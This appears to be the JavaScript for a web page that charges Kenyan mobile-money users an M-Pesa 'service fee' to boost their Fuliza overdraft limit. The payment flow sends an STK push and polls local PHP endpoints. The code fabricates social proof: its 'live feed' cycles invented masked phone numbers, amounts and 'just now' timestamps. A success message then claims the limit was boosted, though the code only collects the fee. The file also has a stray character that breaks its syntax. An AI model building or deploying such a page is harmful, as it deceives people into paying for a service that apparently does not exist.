// Wait for DOM to be fully loaded
document.addEventListener('DOMContentLoaded', function() {
    initializeModal();
    initializeSelectButtons();
    initializePaymentForm();
});

// ==================== INITIALIZATION ====================
function initializeModal() {
    const modal = document.getElementById('paymentModal');
    const closeBtn = document.querySelector('.close');
    
    // Close modal when clicking X
    if (closeBtn) {
        closeBtn.onclick = function() {
            modal.style.display = 'none';
            resetPaymentForm();
        }
    }
    
    // Close modal when clicking outside
    window.onclick = function(event) {
        if (event.target == modal) {
            modal.style.display = 'none';
            resetPaymentForm();
        }
    }
}s

function initializeSelectButtons() {
    document.querySelectorAll('.select-btn').forEach(button => {
        button.addEventListener('click', function() {
            const limit = this.getAttribute('data-limit');
            const fee = this.getAttribute('data-fee');
            showPaymentModal(limit, fee);
        });
    });
}

function initializePaymentForm() {
    const paymentForm = document.getElementById('paymentForm');
    const phoneInput = document.getElementById('phone');
    
    if (paymentForm) {
        paymentForm.addEventListener('submit', handlePaymentSubmit);
    }
    
    // Enforce 10-digit phone number
    if (phoneInput) {
        phoneInput.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length > 10) {
                value = value.substring(0, 10);
            }
            e.target.value = value;
        });
    }
}

// ==================== PAYMENT MODAL ====================
function showPaymentModal(limit, fee) {
    const modal = document.getElementById('paymentModal');
    const selectedPlan = document.getElementById('selectedPlan');
    const amountInput = document.getElementById('amount');
    const limitInput = document.getElementById('limit');
    const feeInput = document.getElementById('fee');
    const paymentForm = document.getElementById('paymentForm');
    const paymentStatus = document.getElementById('paymentStatus');
    
    // Reset form state
    paymentForm.style.display = 'block';
    paymentStatus.style.display = 'none';
    
    // Only charge the fee (not limit + fee)
    const feeNum = parseInt(fee);
    
    selectedPlan.innerHTML = `
        <div class="plan-label">Boosting your Fuliza limit to</div>
        <div class="limit-display">Ksh ${limit}</div>
        <div class="fee-breakdown">
            <span>Service Fee: Ksh ${fee}</span>
        </div>
        <div class="total-payment">
            Pay: <strong>Ksh ${feeNum.toLocaleString()}</strong>
        </div>
    `;
    
    // Only send the fee amount to M-Pesa
    amountInput.value = feeNum;
    limitInput.value = limit;
    feeInput.value = fee;
    
    modal.style.display = 'block';
}

function validatePhone(phone) {
    // Remove all non-digits
    phone = phone.replace(/\D/g, '');
    
    // Check if it's exactly 10 digits and a valid Kenyan number
    // Formats: 07XXXXXXXX, 01XXXXXXXX (10 digits total)
    const isValid = /^(07|01)[0-9]{8}$/.test(phone);
    
    if (!isValid) {
        return false;
    }
    return true;
}

// ==================== PAYMENT SUBMISSION ====================
function handlePaymentSubmit(e) {
    e.preventDefault();
    
    const phone = document.getElementById('phone').value.trim();
    const amount = document.getElementById('amount').value;
    const limit = document.getElementById('limit').value;
    const fee = document.getElementById('fee').value;
    
    // Validate phone
    if (!validatePhone(phone)) {
        return;
    }
    
    // Show loading state
    const submitBtn = e.target.querySelector('button[type="submit"]');
    const btnText = submitBtn.querySelector('.btn-text');
    const spinner = submitBtn.querySelector('.loading-spinner');
    
    btnText.style.display = 'none';
    spinner.style.display = 'inline-block';
    submitBtn.disabled = true;
    
    // Prepare data for sending
    const paymentData = {
        phone: phone,
        amount: amount,
        limit: limit,
        fee: fee
    };
    
    console.log('Sending payment data:', paymentData); // Debug log
    
    // Send STK push request
    fetch('/fuliza+/fuliza/payments/stkpush.php', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(paymentData)
    })
    .then(handleResponse)
    .then(data => {
        console.log('STK Push response:', data); // Debug log
        
        if (data.success) {
            // Hide form, show status
            document.getElementById('paymentForm').style.display = 'none';
            document.getElementById('paymentStatus').style.display = 'block';
            
            // Start polling for payment status
            pollPaymentStatus(data.checkout_id);
        } else {
            showError(data.message || 'Payment initiation failed');
            resetPaymentForm();
        }
    })
    .catch(error => {
        console.error('Fetch error:', error);
        resetPaymentForm();
    });
}

// Helper function to handle fetch responses
function handleResponse(response) {
    if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`);
    }
    return response.json().catch(error => {
        console.error('JSON parse error:', error);
        throw new Error('Invalid JSON response from server');
    });
}

function showError(message) {
    showToast('error', 'Payment Error', message);
}

// ==================== PAYMENT STATUS POLLING ====================
function pollPaymentStatus(checkoutId) {
    if (!checkoutId) {
        resetPaymentForm();
        return;
    }
    
    let attempts = 0;
    const maxAttempts = 60; // 60 seconds
    const statusDiv = document.querySelector('.status-message');
    
    console.log('Starting payment poll for ID:', checkoutId); // Debug log
    
    const interval = setInterval(function() {
        attempts++;
        
        const formData = new FormData();
        formData.append('checkout_id', checkoutId);
        
        fetch('/fuliza+/fuliza/payments/query.php', {
            method: 'POST',
            body: formData
        })
        .then(response => {
            if (!response.ok) {
                throw new Error(`HTTP error! status: ${response.status}`);
            }
            return response.text(); // Get as text first for debugging
        })
        .then(text => {
            console.log('Raw query response:', text); // Debug log
            
            // Try to parse JSON
            let data;
            try {
                data = JSON.parse(text);
            } catch (e) {
                console.error('JSON parse error:', e);
                console.log('Raw response that caused error:', text);
                
                // Check if we got HTML instead of JSON
                if (text.includes('<!DOCTYPE html>')) {
                    statusDiv.innerHTML = createErrorMessage(
                        'Server Error',
                        'The server returned HTML instead of JSON. Please check PHP error logs.'
                    );
                } else {
                    statusDiv.innerHTML = createErrorMessage(
                        'Invalid Response',
                        'Server returned invalid data format'
                    );
                }
                clearInterval(interval);
                return;
            }
            
            // Handle successful JSON response
            if (data.success) {
                if (data.status === 'completed') {
                    clearInterval(interval);
                    statusDiv.innerHTML = createSuccessMessage(data.receipt);
                } else if (data.status === 'failed') {
                    clearInterval(interval);
                    statusDiv.innerHTML = createErrorMessage(
                        'Payment Failed',
                        'Please try again'
                    );
                } else {
                    statusDiv.innerHTML = createWaitingMessage(attempts, maxAttempts);
                }
            } else {
                // Handle API error response
                statusDiv.innerHTML = createErrorMessage(
                    'Error',
                    data.message || 'Unknown error occurred'
                );
            }
        })
        .catch(error => {
            console.error('Polling error:', error);
            statusDiv.innerHTML = createErrorMessage(
                'Connection Error',
                'Please check your internet connection'
            );
        });
        
        // Timeout after max attempts
        if (attempts >= maxAttempts) {
            clearInterval(interval);
            statusDiv.innerHTML = createTimeoutMessage();
        }
    }, 1000); // Poll every second
}

// ==================== MESSAGE TEMPLATES ====================
function createSuccessMessage(receipt) {
    return `
        <div class="status-message">
            <span class="status-icon">✅</span>
            <h3 class="status-title success">Payment Successful!</h3>
            <p class="status-description">Your Fuliza limit has been boosted successfully.</p>
            <div class="receipt-info">
                <strong>M-Pesa Receipt</strong>
                ${receipt || 'N/A'}
            </div>
            <button onclick="window.location.reload()" class="pay-btn" style="margin-top: 20px;">
                Return Home
            </button>
        </div>
    `;
}

function createErrorMessage(title, message) {
    return `
        <div class="status-message">
            <span class="status-icon">❌</span>
            <h3 class="status-title error">${title}</h3>
            <p class="status-description">${message}</p>
            <button onclick="resetPaymentForm()" class="retry-btn">
                Try Again
            </button>
        </div>
    `;
}

function createWaitingMessage(attempts, maxAttempts) {
    const progress = (attempts / maxAttempts) * 100;
    return `
        <div class="status-message">
            <span class="status-icon">⏳</span>
            <h3 class="status-title pending">Waiting for Payment...</h3>
            <p class="status-description">Please check your phone and enter your M-Pesa PIN</p>
            <p style="font-size: 13px; color: #6b7280;">Time remaining: ${maxAttempts - attempts} seconds</p>
            <div class="progress-bar">
                <div class="progress" style="width: ${progress}%;"></div>
            </div>
        </div>
    `;
}

function createTimeoutMessage() {
    return `
        <div class="status-message">
            <span class="status-icon">⏰</span>
            <h3 class="status-title error">Payment Timeout</h3>
            <p class="status-description">Please check your M-Pesa transaction status and try again.</p>
            <button onclick="resetPaymentForm()" class="retry-btn">
                Try Again
            </button>
        </div>
    `;
}

// ==================== RESET FORM ====================
function resetPaymentForm() {
    const form = document.getElementById('paymentForm');
    const status = document.getElementById('paymentStatus');
    const phoneInput = document.getElementById('phone');
    const idInput = document.getElementById('idNumber');
    
    if (form) {
        form.style.display = 'block';
        form.reset();
    }
    
    if (status) {
        status.style.display = 'none';
        status.innerHTML = ''; // Clear status content
    }
    
    const submitBtn = document.querySelector('#paymentForm button[type="submit"]');
    if (submitBtn) {
        const btnText = submitBtn.querySelector('.btn-text');
        const spinner = submitBtn.querySelector('.loading-spinner');
        
        if (btnText) btnText.style.display = 'inline';
        if (spinner) spinner.style.display = 'none';
        submitBtn.disabled = false;
    }
    
    if (phoneInput) {
        phoneInput.value = '';
    }
    
    if (idInput) {
        idInput.value = '';
    }
}

// ==================== DEBUG FUNCTION ====================
// Add this to test if JavaScript is working
function testJavaScript() {
    console.log('JavaScript is working!');
    alert('JavaScript test: OK');
}

// Call test function on load (remove in production)
window.testJavaScript = testJavaScript;

// ==================== TOAST NOTIFICATIONS ====================
function showToast(type, title, message, duration = 5000) {
    const container = document.getElementById('toastContainer');
    if (!container) return;
    
    const toast = document.createElement('div');
    toast.className = `toast toast-${type}`;
    
    const icons = {
        success: '✅',
        error: '❌',
        warning: '⚠️',
        info: 'ℹ️'
    };
    
    toast.innerHTML = `
        <span class="toast-icon">${icons[type] || icons.info}</span>
        <div class="toast-content">
            <div class="toast-title">${title}</div>
            <div class="toast-message">${message}</div>
        </div>
        <button class="toast-close" onclick="dismissToast(this)">&times;</button>
    `;
    
    container.appendChild(toast);
    
    // Auto dismiss
    if (duration > 0) {
        setTimeout(() => {
            dismissToast(toast.querySelector('.toast-close'));
        }, duration);
    }
}

function dismissToast(btn) {
    const toast = btn.closest('.toast');
    if (toast) {
        toast.classList.add('hiding');
        setTimeout(() => {
            toast.remove();
        }, 300);
    }
}

// ==================== LIVE FEED AUTO-REFRESH ====================
const liveFeedData = [
    {initial: 'J', phone: '0721****77', amount: '15,000'},
    {initial: 'M', phone: '0723****12', amount: '9,500'},
    {initial: 'D', phone: '0710****90', amount: '4,200'},
    {initial: 'S', phone: '0722****33', amount: '5,600'},
    {initial: 'M', phone: '0728****01', amount: '21,300'},
    {initial: 'K', phone: '0715****88', amount: '12,000'},
    {initial: 'W', phone: '0729****45', amount: '7,800'},
    {initial: 'A', phone: '0701****23', amount: '18,500'},
    {initial: 'R', phone: '0712****67', amount: '3,400'},
    {initial: 'N', phone: '0725****91', amount: '11,200'},
    {initial: 'B', phone: '0720****56', amount: '8,900'},
    {initial: 'C', phone: '0718****34', amount: '16,700'}
];

function getRandomTime() {
    const times = ['just now', '1 min ago', '2 mins ago', '3 mins ago', '4 mins ago', '5 mins ago'];
    return times[Math.floor(Math.random() * times.length)];
}

function getRandomAmount() {
    const amounts = ['3,000', '4,500', '5,200', '6,800', '7,500', '8,900', '10,000', '12,500', '15,000', '18,000', '20,000', '25,000'];
    return amounts[Math.floor(Math.random() * amounts.length)];
}

function updateLiveFeed() {
    const feedItems = document.querySelectorAll('.feed-item');
    if (feedItems.length === 0) return;
    
    // Randomly update 1-3 feed items
    const numUpdates = Math.floor(Math.random() * 3) + 1;
    
    for (let i = 0; i < numUpdates; i++) {
        const randomIndex = Math.floor(Math.random() * feedItems.length);
        const feedItem = feedItems[randomIndex];
        
        // Get random data
        const randomData = liveFeedData[Math.floor(Math.random() * liveFeedData.length)];
        const newAmount = getRandomAmount();
        const newTime = getRandomTime();
        
        // Update the DOM elements with animation
        const phoneEl = feedItem.querySelector('.phone');
        const amountEl = feedItem.querySelector('.action strong');
        const timeEl = feedItem.querySelector('.feed-time');
        
        if (phoneEl && amountEl && timeEl) {
            phoneEl.textContent = randomData.phone;
            amountEl.textContent = 'Ksh ' + newAmount;
            timeEl.textContent = newTime;
            
            // Add flash animation
            feedItem.style.animation = 'none';
            feedItem.offsetHeight; // Trigger reflow
            feedItem.style.animation = 'flash 0.5s ease';
        }
    }
}

// Add flash animation CSS via JavaScript
const style = document.createElement('style');
style.textContent = `
    @keyframes flash {
        0% { background-color: transparent; }
        50% { background-color: rgba(16, 185, 129, 0.1); }
        100% { background-color: transparent; }
    }
`;
document.head.appendChild(style);

// Start live feed auto-refresh with random intervals (1-4 seconds)
function startLiveFeedRefresh() {
    function scheduleNext() {
        const randomInterval = Math.floor(Math.random() * 3000) + 1000; // 1-4 seconds
        setTimeout(() => {
            updateLiveFeed();
            scheduleNext();
        }, randomInterval);
    }
    scheduleNext();
}

// Initialize on page load
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', startLiveFeedRefresh);
} else {
    startLiveFeedRefresh();
}